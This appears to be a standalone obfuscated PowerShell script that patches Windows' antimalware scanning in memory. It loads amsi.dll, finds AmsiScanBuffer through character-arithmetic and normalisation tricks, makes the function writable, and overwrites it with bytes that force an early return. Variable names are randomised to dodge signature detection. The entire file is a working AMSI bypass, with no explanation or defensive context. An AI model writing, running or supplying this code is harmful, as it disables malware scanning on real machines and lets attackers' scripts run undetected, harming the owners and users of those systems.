$idSSbSoIhtYFpvEnqD = @"
using System;
using System.Runtime.InteropServices;
public class idSSbSoIhtYFpvEnqD {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr i2ip_qo0G, string cbnNKv31);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr WopcEi38PqNy, UIntPtr lrAn2fE, uint fYB5AbJ, out uint u1c0ESQcXM6UoqVa77);
}
"@

Add-Type $idSSbSoIhtYFpvEnqD

$DRDOe4GAYn = [idSSbSoIhtYFpvEnqD]::LoadLibrary("$([CHAr](97+49-49)+[ChAr]([Byte]0x6d)+[chaR]([bYTE]0x73)+[ChAr]([bYTe]0x69)+[cHaR](46*40/40)+[chaR](100)+[ChAR](108)+[ChAr]([byTe]0x6c))")
$LgppY7GcM = [idSSbSoIhtYFpvEnqD]::GetProcAddress($DRDOe4GAYn, "$(('ÂmsíS'+'cànBú'+'ffèr').NoRmAliZE([ChaR]([BytE]0x46)+[ChAR](111+7-7)+[ChAr]([BYTE]0x72)+[CHar]([ByTE]0x6d)+[CHAR](2+66)) -replace [ChAr](92+37-37)+[cHAr]([byte]0x70)+[Char](17+106)+[cHaR](77)+[CHAR]([ByTe]0x6e)+[char]([BytE]0x7d))")
$p = 0
[idSSbSoIhtYFpvEnqD]::VirtualProtect($LgppY7GcM, [uint32]5, 0x40, [ref]$p)
$wZAKhW4s5hss = "0xB8"
$On1ZB0oz019jsaMBjaB0 = "0x57"
$DEqY = "0x00"
$nrCTbYnck8gFTC = "0x07"
$p5_c_37ylP_0Vhw9aY5 = "0x80"
$WmMwv5td = "0xC3"
$E6TljQ = [Byte[]] ($wZAKhW4s5hss,$On1ZB0oz019jsaMBjaB0,$DEqY,$nrCTbYnck8gFTC,+$p5_c_37ylP_0Vhw9aY5,+$WmMwv5td)
[System.Runtime.InteropServices.Marshal]::Copy($E6TljQ, 0, $LgppY7GcM, 6)